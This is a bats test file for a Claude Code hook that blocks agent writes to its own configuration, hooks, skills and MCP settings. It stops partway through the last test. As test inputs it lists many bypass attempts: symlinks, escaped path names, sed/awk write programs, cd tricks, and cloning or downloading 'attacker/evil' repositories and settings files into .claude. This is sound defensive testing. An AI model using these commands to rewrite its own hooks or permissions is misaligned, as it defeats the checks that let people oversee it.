#!/usr/bin/env bats
#
# enforce-allowed-dirs' write-target policy: the protected Claude Code configuration paths (for
# Edit, Write, NotebookEdit and Bash), the writer/read-only classification in command-allowlist,
# and the check that every Bash write target is inside the allowed roots. The path-taking command
# checks (cd, git -C, npm --prefix, find, rm/mv/cp) are in enforce-allowed-dirs.bats.

load test_helper

SOURCE_HOOK_DIR="${REPO_ROOT}/containers/base/development-full/claude-hooks"

# Each test gets a private copy of the hook next to its own command-allowlist (the shipped one,
# plus pushd, which reject-obfuscated-commands rejects but the hook's cd-family handling still
# covers) and an allowed-dirs listing the sandbox repo, HOME, a source directory SRC and a private
# TMPDIR, all inside the sandbox, so a protected path is reported as a configuration write rather
# than as outside the roots, and TEST_TMP/outside is outside every root wherever the sandbox lives.
setup() {
    setup_isolated_env
    SRC="${TEST_TMP}/src"
    export TMPDIR="${TEST_TMP}/tmp"
    mkdir -p "${TEST_TMP}/repo/sub" "${TEST_TMP}/outside" "${TMPDIR}" "${SRC}"
    HOOK_DIR="${TEST_TMP}/hooks"
    HOOK="${HOOK_DIR}/enforce-allowed-dirs"
    mkdir -p "${HOOK_DIR}"
    cp "${SOURCE_HOOK_DIR}/enforce-allowed-dirs" "${HOOK}"
    cp "${SOURCE_HOOK_DIR}/command-allowlist" "${HOOK_DIR}/command-allowlist"
    printf '%s\n' 'pushd read-only' >> "${HOOK_DIR}/command-allowlist"
    printf '%s\n' "${TEST_TMP}/repo" "${HOME}" "${SRC}" "${TMPDIR}" > "${HOOK_DIR}/allowed-dirs"
}

teardown() {
    cleanup_stubs
}

# Pipes a file-tool payload (Edit/Write use file_path, NotebookEdit notebook_path) into the hook
# with cwd set to TEST_TMP/repo, so relative paths resolve inside the test sandbox.
run_file_tool() {
    local tool="$1" path="$2" key="file_path"
    [ "${tool}" = "NotebookEdit" ] && key="notebook_path"
    local payload
    payload=$(jq -n --arg tool "${tool}" --arg key "${key}" --arg path "${path}" '{tool_name: $tool, tool_input: {($key): $path}}')
    run bash -c 'cd "$3" && printf "%s" "$1" | bash "$2"' _ "${payload}" "${HOOK}" "${TEST_TMP}/repo"
}

run_payload() {
    run bash -c 'printf "%s" "$1" | bash "$2"' _ "$1" "${HOOK}"
}

run_in_repo() {
    run_hook_in_dir "$1" "${TEST_TMP}/repo"
}

assert_blocked_config_write() {
    [ "${status}" -eq 2 ] || { echo "expected a block, got status ${status}: ${output}" >&2; return 1; }
    [[ "${output}" == *'writing to Claude Code configuration'* ]] || { echo "wrong message: ${output}" >&2; return 1; }
    [[ "${output}" == *'command did not run'* ]] || { echo "missing 'command did not run': ${output}" >&2; return 1; }
}

# assert_each_in_dir <dir> <expected status> <message substring or ''> <command>... - runs each
# command from dir and checks the status and, when given, the message.
assert_each_in_dir() {
    local dir="$1" want="$2" message="$3" cmd
    shift 3
    for cmd in "$@"; do
        run_hook_in_dir "${cmd}" "${dir}"
        [ "${status}" -eq "${want}" ] || { echo "status ${status}, want ${want}: ${cmd}: ${output}" >&2; return 1; }
        [ -z "${message}" ] || [[ "${output}" == *"${message}"* ]] || { echo "wrong message for ${cmd}: ${output}" >&2; return 1; }
    done
}

# assert_each <expected status> <message substring or ''> <command>... - assert_each_in_dir from
# the sandbox repo.
assert_each() {
    assert_each_in_dir "${TEST_TMP}/repo" "$@"
}

# assert_each_config_write_in_dir <dir> <command>... - runs each command from dir and checks it is
# blocked as a write to Claude Code configuration.
assert_each_config_write_in_dir() {
    local dir="$1" cmd
    shift
    for cmd in "$@"; do
        run_hook_in_dir "${cmd}" "${dir}"
        assert_blocked_config_write || { echo "did not block: ${cmd}" >&2; return 1; }
    done
}

# assert_each_config_write <command>... - assert_each_config_write_in_dir from the sandbox repo.
assert_each_config_write() {
    assert_each_config_write_in_dir "${TEST_TMP}/repo" "$@"
}

# --- Edit / Write / NotebookEdit --------------------------------------------

@test "Edit, Write and NotebookEdit of the user's ~/.claude/settings.json are blocked" {
    local tool
    for tool in Edit Write NotebookEdit; do
        run_file_tool "${tool}" "${HOME}/.claude/settings.json"
        assert_blocked_config_write || { echo "did not block ${tool}" >&2; return 1; }
    done
}

@test "a write to each protected config location is blocked" {
    local path
    for path in \
        "${TEST_TMP}/repo/.claude/settings.json" \
        "${TEST_TMP}/repo/.claude/settings.local.json" \
        "${TEST_TMP}/repo/sub/.claude/settings.local.json" \
        "${HOME}/.claude/settings.json.bak" \
        "${HOME}/.claude.json" \
        "${TEST_TMP}/repo/.mcp.json" \
        "${HOME}/.claude/hooks/enforce-git-dash-c" \
        "${HOME}/.claude/agents/credfeto-committer.md" \
        "${HOME}/.claude/skills/update-config/SKILL.md" \
        /etc/claude-code/managed-settings.json \
        /etc/claude-code/hooks/command-allowlist \
        "~root/.claude/settings.json"; do
        run_file_tool Write "${path}"
        assert_blocked_config_write || { echo "did not block ${path}" >&2; return 1; }
    done
}

@test "a relative path to the repo's own .claude/settings.json is blocked" {
    run_file_tool Edit ".claude/settings.json"
    assert_blocked_config_write
}

@test "a path that only names a protected file once normalised is blocked" {
    local path
    for path in "${TEST_TMP}/repo/sub/../.mcp.json" "${TEST_TMP}/repo/.claude/./settings.json" "${TEST_TMP}/repo/.claude//settings.json"; do
        run_file_tool Edit "${path}"
        assert_blocked_config_write || { echo "did not block ${path}" >&2; return 1; }
    done
}

@test "a symlink whose target is a protected file is blocked" {
    mkdir -p "${HOME}/.claude"
    printf '{}' > "${HOME}/.claude/settings.json"
    ln -s "${HOME}/.claude/settings.json" "${TEST_TMP}/repo/notes.json"
    run_file_tool Edit "${TEST_TMP}/repo/notes.json"
    assert_blocked_config_write
}

@test "a protected name reached through a symlinked .claude directory is blocked even though it resolves elsewhere" {
    mkdir -p "${TEST_TMP}/dotfiles/claude"
    ln -s "${TEST_TMP}/dotfiles/claude" "${TEST_TMP}/repo/.claude"
    run_file_tool Edit "${TEST_TMP}/repo/.claude/./settings.json"
    assert_blocked_config_write
}

@test "ordinary files, files outside the roots and the tracked sources under containers/ are allowed for the file tools" {
    local path
    for path in \
        "${TEST_TMP}/repo/src/Program.cs" \
        "${TEST_TMP}/repo/docs/claude.md" \
        "${TEST_TMP}/outside/notes.md" \
        "${REPO_ROOT}/containers/base/development-full/claude-managed-settings.json" \
        "${REPO_ROOT}/containers/base/development-full/claude-hooks/command-allowlist"; do
        run_file_tool Edit "${path}"
        [ "${status}" -eq 0 ] || { echo "did not allow ${path}: ${output}" >&2; return 1; }
    done
}

@test "a file tool payload with no path is blocked (fail closed)" {
    run_payload '{"tool_name":"Edit","tool_input":{}}'
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'no file path'* ]]
}

# --- Bash: protected paths ----------------------------------------------------

@test "each Bash write form into a protected file is blocked" {
    assert_each_config_write \
        "sed -i 's/a/b/' .claude/settings.json" \
        "sed -ni 's/a/b/p' .mcp.json" \
        "sed --in-place=.bak 's/a/b/' .mcp.json" \
        "cp settings.json ${HOME}/.claude/settings.json" \
        "mv new.json .claude/settings.local.json" \
        "ln -sf ${SRC}/evil ${HOME}/.claude/hooks/enforce-git-dash-c" \
        "echo '{}' | tee .mcp.json" \
        "echo '{}' > .claude/settings.json" \
        "echo '{}' >> ${HOME}/.claude.json" \
        "echo '{}' &> sub/.claude/settings.json" \
        "nice tee .claude/settings.json"
}

@test "a write into .claude/commands, the repo's or the user's, is blocked for every write form; reading it is allowed" {
    local tool path
    for tool in Edit Write NotebookEdit; do
        for path in ".claude/commands/x.md" "${HOME}/.claude/commands/x.md" "${TEST_TMP}/repo/.claude/commands"; do
            run_file_tool "${tool}" "${path}"
            assert_blocked_config_write || { echo "did not block ${tool} ${path}" >&2; return 1; }
        done
    done
    assert_each_config_write \
        "printf x > .claude/commands/evil.md" \
        "printf x > ${HOME}/.claude/commands/evil.md" \
        "echo x | tee .claude/commands/x.md" \
        "echo x | tee ${HOME}/.claude/commands/x.md" \
        "cp ${SRC}/x.md .claude/commands/x.md" \
        "cp ${SRC}/x.md ${HOME}/.claude/commands/x.md" \
        "mv ${SRC}/x.md .claude/commands/x.md" \
        "mv ${SRC}/x.md ${HOME}/.claude/commands/x.md" \
        "ln -s ${SRC}/x.md .claude/commands/x.md" \
        "ln -s .claude/commands/x.md ${SRC}/link.md" \
        "ln -s ${HOME}/.claude/commands/x.md ${SRC}/link.md" \
        "sed -i 's/a/b/' .claude/commands/x.md" \
        "sed -i 's/a/b/' ${HOME}/.claude/commands/x.md" \
        "sed -n 'w .claude/commands/x.md' ${SRC}/payload"
    mkdir -p "${TEST_TMP}/repo/.claude/commands"
    assert_each 2 '' "cd .claude/commands && touch x.md"
    assert_each 0 '' "cat .claude/commands/x.md" "cd .claude/commands && ls"
}

@test "every other allowlisted command that writes a named file is blocked on a protected path" {
    assert_each_config_write \
        "touch .claude/settings.json" \
        "rm -f ${HOME}/.claude/settings.json" \
        "mkdir -p .claude/hooks" \
        "chmod 0666 .claude/settings.local.json" \
        "sort -o .claude/settings.local.json ${SRC}/x" \
        "uniq ${SRC}/x .claude/settings.local.json" \
        "awk '{print > \".claude/settings.local.json\"}' ${SRC}/x" \
        "awk -i inplace 1 .mcp.json" \
        "curl -sSo .claude/settings.local.json https://example.com/x" \
        "git -C . checkout main -- .claude/settings.json" \
        "git -C . restore --source=main .claude/settings.local.json" \
        "git mv notes.json .claude/settings.json" \
        "sed --in 's/a/b/' .claude/settings.json" \
        "sed --in-pl=.bak 's/a/b/' .mcp.json" \
        "sed -n 'w .claude/settings.json' ${SRC}/payload" \
        "sed 's/^//w .claude/skills/x/SKILL.md' ${SRC}/p" \
        "sed -n 'w .claude//settings.json' ${SRC}/payload" \
        "sed -n 'w .claude/./skills/x/SKILL.md' ${SRC}/payload" \
        "sed -n 'w .claude/x/../settings.json' ${SRC}/payload" \
        "awk '{print > \".claude//settings.local.json\"}' ${SRC}/x" \
        "awk '{print > \".claude/./hooks/x\"}' ${SRC}/x" \
        "awk '{print > \".claude/x/../agents/y\"}' ${SRC}/x" \
        "sed -n 'w /etc//claude-code/managed-settings.json' ${SRC}/payload" \
        "sqlite3 :memory: '.once .claude//settings.json' 'select 1;'" \
        "git -C . clone https://github.com/x/y .claude/skills/evil" \
        "git -C . show --output=.claude/hooks/x HEAD:payload" \
        "git -C . diff --output .claude/settings.json" \
        "git -C . diff --outp=.claude/settings.json" \
        "git -C . diff --o=.claude/settings.json" \
        "git -C . format-patch --output-directory .claude/skills HEAD~1" \
        "git -C . format-patch --output-dir .claude/skills HEAD~1" \
        "git -C . format-patch --output-d=.claude/skills HEAD~1" \
        "git -C . format-patch --output- .claude/skills HEAD~1" \
        "echo x >& .claude/settings.json" \
        "echo x >&.mcp.json" \
        "openssl base64 -d -in payload.b64 -out .claude/settings.json" \
        "sqlite3 :memory: '.once .claude/settings.json' 'select 1;'" \
        "hugo -s site -d ${HOME}/.claude/skills" \
        "trivy fs . --format template --template x --output .claude/settings.json" \
        "xmllint --output .mcp.json in.xml" \
        "eslint -o .claude/settings.json src" \
        "gh run download 123 -D .claude/skills" \
        "gh repo clone x/y .claude/agents" \
        "gh release download v1 --output .claude/settings.json" \
        "gh x --output .claude/settings.json" \
        "gh x --output=.claude/settings.json" \
        "gh x --dir .claude/skills" \
        "gh x --dir=.claude/skills" \
        "gh x -O .claude/settings.json" \
        "gh x -O.claude/settings.json" \
        "gh x -O=.claude/settings.json" \
        "gh x -D .claude/skills" \
        "gh x -D.claude/skills" \
        "gh x -D=.claude/skills" \
        "flake8 --format=x --output-file=.claude/settings.local.json x.py" \
        "pylint --output=${HOME}/.claude/agents/x.md x.py" \
        "ruff check -o .claude/settings.json ." \
        "stylelint -o .claude/settings.json src" \
        "markdownlint -o .claude/settings.json docs" \
        "markdownlint-cli2 --output .claude/settings.json docs" \
        "cfn-lint --output-file .claude/settings.json t.yaml" \
        "sqlfluff lint --write-output .claude/settings.json q.sql" \
        "ansible-lint --sarif-file .claude/settings.json" \
        "mktemp ${HOME}/.claude/agents/XXXX.md" \
        "shfmt -w .claude/hooks/x" \
        "end-of-file-fixer .claude/settings.json" \
        "trailing-whitespace-fixer .claude/agents/x.md" \
        "mixed-line-ending --fix=lf .mcp.json" \
        "bats -o .claude/skills --report-formatter junit test" \
        "python3 build.py --out .claude/settings.json" \
        "dotnet build -o ${HOME}/.claude/hooks" \
        "dotnet changelog -f .claude/settings.json -a Fixed -m x" \
        "npm run build -- --outDir=.claude/skills"
}

@test "a sed or awk program that only mentions a protected name is blocked by design (use the Edit tool)" {
    assert_each_config_write \
        "sed -i 's|~/.claude/hooks/|/etc/claude-code/hooks/|g' README.md" \
        "awk '{ sub(\"~/.claude.json\", \"x\"); print }' notes.txt"
    run_file_tool Edit "${TEST_TMP}/repo/README.md"
    [ "${status}" -eq 0 ]
}

@test "git checkout, restore and rm block reading pathspecs from a file or stdin in every form" {
    assert_each 2 'reads paths from a file or stdin, which this hook cannot check' \
        "echo .claude/settings.json | git checkout --pathspec-from-file -" \
        "echo .claude/settings.json | git checkout --pathspec-from-file=-" \
        "echo .claude/settings.json | git restore --pathspec-from-file=-" \
        "git restore --pathspec-from-file=list.txt" \
        "git -C . checkout --pathspec-from-file list.txt" \
        "git -C . checkout --pathspec-fr=list.txt" \
        "git -C . checkout main --pathspec-from-file=list.txt --pathspec-file-nul" \
        "git -C . checkout --pathspec-fi --pathspec-from-file=list.txt" \
        "git -C . checkout --pathspec-f=list.txt" \
        "git -C . checkout --pat=list.txt" \
        "git -C . restore --pathspec-from=list.txt" \
        "git rm --pathspec-from-file=list.txt" \
        "git rm --pathspec-file-nul --pathspec-from-file list.txt"
}

@test "ordinary git checkouts and options that only share a prefix with --pathspec-from-file are allowed" {
    assert_each 0 '' \
        "git -C . checkout -- ok.txt" \
        "git -C . checkout main" \
        "git -C . checkout --patch -- ok.txt" \
        "git -C . checkout --patc -- ok.txt" \
        "git -C . checkout --progress main" \
        "git -C . checkout --prog main" \
        "git -C . checkout --no-pathspec-from-file -- ok.txt" \
        "git -C . log --oneline -- list.txt"
}

@test "git stash push checks every pathspec, named or assumed, and blocks pathspecs read from a file or stdin" {
    assert_each_config_write \
        'git -C . stash push -- .claude/settings.json' \
        'git -C . stash push .claude/settings.json' \
        'git -C . stash "push" -u -m why -- .claude/settings.json' \
        'git -C . stash -- .claude/settings.json' \
        'git -C . stash -p .claude/settings.json' \
        'git -C . stash push --message=why .claude/agents'
    assert_each 2 'outside the allowed directories' \
        'git -C . stash push -- ../outside/x' \
        'git -C sub stash -- ../../outside/x'
    assert_each 2 'reads paths from a file or stdin, which this hook cannot check' \
        'git -C . stash push --pathspec-from-file=list.txt' \
        'echo .claude/settings.json | git -C . stash push --pathspec-from-file=-' \
        'echo .claude/settings.json | git -C . stash --pathspec-from-file=-' \
        'git -C . stash push --pathspec-fr=list.txt' \
        'git -C . stash -u --pathspec-file-nul --pathspec-from-file list.txt'
}

@test "git stash with an unknown or non-literal action fails closed" {
    assert_each 2 'could not be verified (non-literal argument)' "git -C . stash \"\$sub\" -- .claude/settings.json"
    assert_each 2 'failing closed' 'git -C . stash frobnicate .claude/settings.json'
}

@test "git stash with no pathspec, a message naming a protected path, and the stash actions that name no path are allowed" {
    assert_each 0 '' \
        'git -C . stash' \
        'git -C . stash push' \
        'git -C . stash -u' \
        'git -C . stash push -m "see .claude/settings.json"' \
        'git -C . stash push --message "see .claude/settings.json" -- ok.txt' \
        'git -C . stash save "see .claude/settings.json"' \
        'git -C . stash push -- ok.txt' \
        'git -C . stash -u -- ok.txt' \
        'git -C sub stash push -- ../ok.txt' \
        'git -C . stash list' \
        'git -C . stash show -p stash@{0}' \
        'git -C . stash drop' \
        'git -C . stash pop' \
        'git -C . stash apply --index' \
        'git -C . stash branch topic' \
        'git -C . stash create "see .claude/settings.json"' \
        'git -C . stash -h'
}

@test "git stash with the default action or -u, and stash show --output, block a protected path in every spelling" {
    assert_each_config_write \
        'git -C . stash -- .claude/skills/x' \
        'git -C . stash push -u -- .claude/agents/x.md' \
        'git -C . stash show --output=.claude/settings.json' \
        'git -C . stash show --output .claude/settings.json' \
        'git -C . stash show -p stash@{0} --output=.claude/hooks/x'
    assert_each 2 'outside the allowed directories' 'git -C . stash show -p --output=../outside/x'
    assert_each 2 'reads paths from a file or stdin, which this hook cannot check' \
        'git -C . stash push --pathspec-from-file=-' \
        'git -C . stash save --pathspec-from-file=-'
}

# git stash save takes no pathspec: git joins every word after its options, -- included, into the
# stash message, so these are a bare git stash with a message.
@test "git stash save words after -- are its message, and stash show --output to an ordinary file is allowed" {
    assert_each 0 '' \
        'git -C . stash save -- .claude/settings.json' \
        'git -C . stash save .claude/settings.json' \
        "git -C . stash push -m 'see .claude/settings.json'" \
        'git -C . stash list' \
        'git -C . stash show --output=ok.txt'
}

@test "the same writing commands on ordinary paths are allowed" {
    assert_each 0 '' \
        "touch out.txt" \
        "rm -rf build" \
        "mkdir -p sub/dir" \
        "chmod +x containers/base/development-full/claude-hooks/enforce-allowed-dirs" \
        "sort -o sorted.txt in.txt" \
        "awk '{print \$1}' in.txt" \
        "curl -sSo out.json https://example.com/x" \
        "git -C . checkout main -- src/file.txt" \
        "git -C . log --oneline" \
        "git -C . log --oneline -- .claude/settings.json" \
        "git -C . log --oneline -- .claude" \
        "git -C . clone https://github.com/x/y vendor/y" \
        "git -C . diff --output=changes.patch" \
        "git -C . diff --output-indicator-new=+ -- .claude/settings.json" \
        "git -C . log --output-indicator-old=- -- .claude" \
        "git -C . diff --output-indicator-context=' ' -- .mcp.json" \
        "sed -n 'w out.txt' in.txt" \
        "echo x >&2" \
        "echo x 2>&1 >& log.txt" \
        "echo x >&-" \
        "openssl base64 -d -in payload.b64 -out out.json" \
        "gh run download 123 -D artifacts" \
        "flake8 --output-file=flake8.txt src" \
        "end-of-file-fixer README.md" \
        "bats test/enforce-allowed-dirs-write-targets.bats" \
        "ruff check ." \
        "mktemp -d" \
        "shfmt -w containers/base/development-full/claude-hooks/enforce-allowed-dirs" \
        "gh pr create --title fix --body 'blocks writes to .claude/settings.json'" \
        "gh issue comment 1 --body 'see ~/.claude/hooks'" \
        "gh pr edit 1 --body 'see .claude/settings.json'" \
        "gh api repos/o/r/issues/1/comments -f body='see .claude/settings.json'" \
        "gh issue create --title x --body-file ${SRC}/notes.md" \
        "dotnet changelog -f CHANGELOG.md -a Fixed -m 'blocks writes to ~/.claude/settings.json'" \
        "dotnet test --filter 'FullyQualifiedName~Foo' -p:CollectCoverage=true"
}

@test "a copy, move or link whose destination is a .claude directory is blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    assert_each_config_write \
        "cp ${SRC}/settings.local.json .claude/" \
        "cp ${SRC}/settings.local.json ${HOME}/.claude/" \
        "cp -t .claude ${SRC}/settings.local.json" \
        "mv ${SRC}/evil .claude" \
        "cp -r ${SRC}/evil sub/.claude" \
        "ln -s ${SRC}/fake .claude" \
        "ln -s -t .claude ${SRC}/fake"
}

@test "a write into a protected directory reached through a leading cd or pushd is blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    assert_each_config_write \
        "cd .claude && cp ${SRC}/x settings.local.json" \
        "pushd .claude && echo '{}' > settings.local.json" \
        "cd ${TEST_TMP}/repo/sub && cp ${SRC}/x ../.claude/settings.local.json"
}

@test "a cd this hook cannot follow is blocked before anything is written through it" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    assert_each 2 'brace, tilde or backslash' "cd ~/.claude && tee settings.json"
    assert_each 2 'is a glob' "cd .cl* && cp ${SRC}/x settings.local.json"
    assert_each 2 'unknowable' "ls && cd .claude && cp ${SRC}/x settings.local.json"
}

@test "a relative write target after a leading cd resolves against that directory, through symlinks" {
    mkdir -p "${TEST_TMP}/repo/elsewhere/.claude"
    ln -s "${TEST_TMP}/repo/elsewhere/.claude" "${TEST_TMP}/repo/elsewhere/innocent"
    run_in_repo "cd ${TEST_TMP}/repo/elsewhere && cp ${SRC}/x innocent/settings.json"
    assert_blocked_config_write
}

@test "a relative glob write target is expanded in the leading cd's directory" {
    mkdir -p "${TEST_TMP}/repo/sub/.claude"
    printf '{}' > "${TEST_TMP}/repo/sub/.claude/settings.local.json"
    run_in_repo "cd sub && cp ${SRC}/x .cl*/settings.local.json"
    assert_blocked_config_write
}

@test "ANSI-C quoting in a write target is blocked, since it can spell a protected name in escapes" {
    assert_each 2 'could not be verified' \
        "echo x > \$'.claude/settings.json'" \
        "echo x > \$'\\x2e\\x63laude/settings.json'" \
        "cp ${SRC}/x \$'out.txt'"
}

@test "cd into an ordinary directory, or into .claude without writing anything, is allowed" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    assert_each 0 '' "cd sub && cp a.txt b.txt" "cd .claude && ls" "cd sub && echo x > out.txt" "cd .claude && gh issue view 1"
}

@test "a writer that can write into its working directory without naming it is blocked there" {
    mkdir -p "${TEST_TMP}/repo/.claude/skills"
    assert_each 2 'through a cd into it' \
        "cd .claude && gh release download v1 -R x/y" \
        "cd .claude && curl -O https://example.com/settings.json" \
        "cd .claude && sed -n 'w settings.json' ${SRC}/payload" \
        "cd .claude/skills && git -C . clone https://github.com/x/evil" \
        "ls && cd ${TEST_TMP}/repo/.claude && curl -O https://example.com/settings.json" \
        "for x in a b; do curl -O https://example.com/settings.json; cd ${TEST_TMP}/repo/.claude; done"
    run_hook_in_dir "curl -O https://example.com/settings.json" "${TEST_TMP}/repo/.claude"
    assert_blocked_config_write
    run_hook_in_dir "gh release download v1 -R x/y" "${TEST_TMP}/repo/.claude"
    assert_blocked_config_write
    run_hook_in_dir "gh issue view 1" "${TEST_TMP}/repo/.claude"
    [ "${status}" -eq 0 ]
    run_in_repo "git -C .claude clone https://github.com/x/skills"
    assert_blocked_config_write
}

@test "a cd is checked where bash's logical cd lands: a .. after a link out of .claude stays in .claude" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    ln -s "${TEST_TMP}/repo/sub" "${TEST_TMP}/repo/.claude/x"
    assert_each_config_write \
        "cd .claude/x/.. && curl -O https://example.com/settings.json" \
        "pushd .claude/x/.. && sed -n 'w settings.json' ${SRC}/payload" \
        "cd .claude/x/.. && echo '{}' > settings.json"
    assert_each 0 '' "cd .claude/x/.. && ls" "cd .claude/x && curl -O https://example.com/x.json"
}

@test "a cd .. through a symlinked directory is checked where bash lands, so an allowed landing stays allowed" {
    mkdir -p "${TEST_TMP}/repo/links" "${TEST_TMP}/outside/skill"
    ln -s "${TEST_TMP}/outside/skill" "${TEST_TMP}/repo/links/skill"
    assert_each 0 '' \
        "cd links/skill/.. && echo x > out.txt" \
        "cd links/skill/.. && curl -O https://example.com/x.json"
    run_hook_in_dir "cd .. && echo x > out.txt" "${TEST_TMP}/repo/links/skill"
    [ "${status}" -eq 0 ] || { echo "got: ${output}" >&2; return 1; }
    assert_each 2 'outside the allowed directories' "cd links/skill && ls"
}

@test "a cd bash would resolve physically instead of logically is blocked (fail closed)" {
    mkdir -p "${TEST_TMP}/outside/a" "${TEST_TMP}/outside/x" "${TEST_TMP}/outside/real"
    ln -s "${TEST_TMP}/outside/a" "${TEST_TMP}/repo/l"
    assert_each 2 'is not a directory' "cd l/../x/.. && ls" "cd sub/file/.. && ls"
    assert_each 2 'does not exist as a directory' "cd l/../real && ls"
    assert_each 0 '' "cd ./sub/./../sub && ls"
}

@test "a cd into a directory the shell cannot enter is blocked (fail closed)" {
    [ "$(id -u)" -ne 0 ] || skip "root can enter any directory"
    mkdir -p "${TEST_TMP}/repo/locked"
    chmod 0600 "${TEST_TMP}/repo/locked"
    run_in_repo "cd locked && ls"
    chmod 0700 "${TEST_TMP}/repo/locked"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *'does not exist as a directory the shell can enter'* ]] || { echo "got: ${output}" >&2; return 1; }
}

@test "a writer anywhere inside a .claude tree is blocked, since a .. in program text reaches a protected entry" {
    mkdir -p "${TEST_TMP}/repo/.claude/x"
    assert_each 2 'through a cd into it' \
        "cd .claude/x && sed -n 'w ../settings.json' ${SRC}/payload" \
        "cd .claude/x && awk '{print > \"../hooks/evil\"}' ${SRC}/payload" \
        "cd .claude/x && sqlite3 :memory: '.once ../settings.local.json' 'select 1;'"
    run_hook_in_dir "sed -n 'w ../settings.json' ${SRC}/payload" "${TEST_TMP}/repo/.claude/x"
    assert_blocked_config_write
    # A later cd makes the working directory unknowable, but the writer can run before it.
    assert_each_config_write_in_dir "${TEST_TMP}/repo/.claude" \
        "ls; true || cd ${TEST_TMP}/repo; sed -n 'w settings.json' ${SRC}/payload" \
        "for x in a; do ls; sed -n 'w settings.json' ${SRC}/payload; cd ${TEST_TMP}/repo; done"
    # The same, from a working directory that reaches .claude only through a symlink.
    ln -s "${TEST_TMP}/repo/.claude" "${TEST_TMP}/repo/innocent"
    run_hook_in_dir "ls; true || cd ${TEST_TMP}/repo; sed -n 'w settings.json' ${SRC}/payload" "${TEST_TMP}/repo/innocent"
    assert_blocked_config_write
    assert_each 0 '' "cd .claude/x && ls"
}

@test "git clone with no directory is checked against the directory git names after the repository" {
    assert_each_config_write \
        "git -C . clone https://github.com/x/.claude.git" \
        "git -C . clone https://github.com/x/.claude/" \
        "git -C . clone https://github.com/x/.claude/.git" \
        "git -C . clone git@github.com:x/.claude.git" \
        "git -C . clone host:.mcp.json.git" \
        "git -C . clone --depth 1 https://github.com/x/.claude.bundle"
    assert_each 0 '' "git -C . clone https://github.com/x/y.git" "git -C . clone git@github.com:x/y"
}

@test "gh repo fork and create cloning through --clone or create's -c are checked, words after -- and default directory included" {
    assert_each_config_write \
        "gh repo fork attacker/evil --clone -- .claude/skills/evil" \
        "gh repo fork attacker/.claude --clone" \
        "gh repo fork https://github.com/attacker/.claude.git --clone" \
        "gh repo fork attacker/evil --clone --fork-name .claude" \
        "gh repo fork attacker/evil --clone --fork-name=.claude" \
        "gh repo fork attacker/.claude --clone=true" \
        "gh repo fork attacker/.claude --clone=1" \
        "gh repo create .claude --clone" \
        "gh repo create attacker/.claude --public -c" \
        "gh repo create .claude -c=true" \
        "gh repo create .claude -cdtext" \
        "gh repo new .claude --clone" \
        "gh repo create .claude --template attacker/evil --clone"
    assert_each 2 'outside the allowed directories' \
        "gh repo fork attacker/evil --clone -- ../outside/evil" \
        "gh repo fork attacker/evil --clone -- ${TEST_TMP}/outside/evil"
}

@test "gh repo fork and create cloning into a .claude working directory are blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    assert_each 2 'through a cd into it' \
        "cd .claude && gh repo fork attacker/agents --clone --fork-name agents" \
        "cd .claude && gh repo create hooks --clone" \
        "cd .claude && gh repo create hooks --clone=true" \
        "cd .claude && gh repo create x -c"
    assert_each_config_write_in_dir "${TEST_TMP}/repo/.claude" \
        "gh repo fork attacker/agents --clone --fork-name agents" \
        "gh repo create hooks --clone" \
        "gh repo create x -c"
}

@test "a non-literal word in gh repo fork or create, or a non-literal subcommand with -c, fails closed" {
    assert_each 2 'non-literal argument' \
        "gh repo fork attacker/evil \"\$X\"" \
        "gh repo create \"\$NAME\" --private" \
        "gh \"\$G\" \"\$S\" x -c"
}

@test "gh repo fork and create from repo cwd that clone into an ordinary directory or not at all are allowed" {
    assert_each 0 '' \
        "gh repo fork o/r --clone" \
        "gh repo fork o/r --clone=false" \
        "gh repo fork o/r" \
        "gh repo create x --public" \
        "gh repo create x --public --clone" \
        "gh repo create x -c=false" \
        "gh repo fork o/r -- --depth 1" \
        "gh repo clone o/r" \
        "gh repo clone o/r checkout-dir"
}

@test "a gh command not on the read-only table is a writer: H1-H6 sweep hits are blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude/skills/y"
    # H1: gh repo clone's default directory; H2: pr checkout --worktree; H4: repo create --source;
    # H5: codespace cp to a local path; an unknown command (an alias or extension).
    assert_each_config_write \
        "gh repo clone https://github.com/x/.claude.git" \
        "gh repo clone x/.claude" \
        "gh pr checkout 1 --worktree .claude/skills/x" \
        "gh issue develop 1 --worktree .claude/skills/x" \
        "gh repo create x --source=.claude/skills/y --remote=evil" \
        "gh repo create x --source .claude/skills/y --push" \
        "gh codespace cp remote:x .claude/settings.json" \
        "gh some-extension .claude/settings.json" \
        "gh pr --repo o/r checkout 1 .claude/skills/x"
    assert_each 2 'outside the allowed directories' \
        "gh pr checkout 1 --worktree=../outside/x" \
        "gh codespace cp remote:x ${TEST_TMP}/outside/x"
    # H3: pr checkout, and H6: repo fork --remote, write into a .claude working directory's repo.
    assert_each 2 'through a cd into it' \
        "cd .claude && gh pr checkout 1" \
        "cd .claude/skills/y && gh repo fork o/r --remote" \
        "cd .claude && gh repo fork o/r --clone=false" \
        "cd .claude && gh repo create x --private" \
        "cd .claude && gh some-extension" \
        "cd .claude && gh pr merge 1 -d" \
        "cd .claude && gh pr merge 1 --squash --delete-branch" \
        "cd .claude && gh pr merge 1 -sd" \
        "cd .claude && gh pr close 1 --delete-branch=true"
    assert_each_config_write_in_dir "${TEST_TMP}/repo/.claude/skills/y" \
        "gh pr checkout 1" "gh repo fork o/r --remote"
}

@test "gh alias set and import block, and a non-literal gh command word fails closed" {
    assert_each 2 'defines a command whose writes appear on no command line' \
        "gh alias set rf 'repo fork attacker/.claude --clone'" \
        "gh alias set --shell x 'touch y'" \
        "gh alias import aliases.yml"
    assert_each 2 'non-literal argument' \
        "gh \"\$G\" view 1" \
        "gh pr \"\$S\" 1" \
        "gh pr merge 1 --auto \"\$FLAG\""
}

@test "the agents' read-only and remote-only gh workflows are allowed from the repo and from .claude, with text naming config" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    local cmd
    for cmd in \
        "gh pr create --repo o/r --draft --title fix --body 'blocks writes to .claude/settings.json'" \
        "gh pr comment 1 --repo o/r --body 'see .claude/settings.json'" \
        "gh pr comment 1 --repo o/r --body \"\$(cat ${SRC}/body.md)\"" \
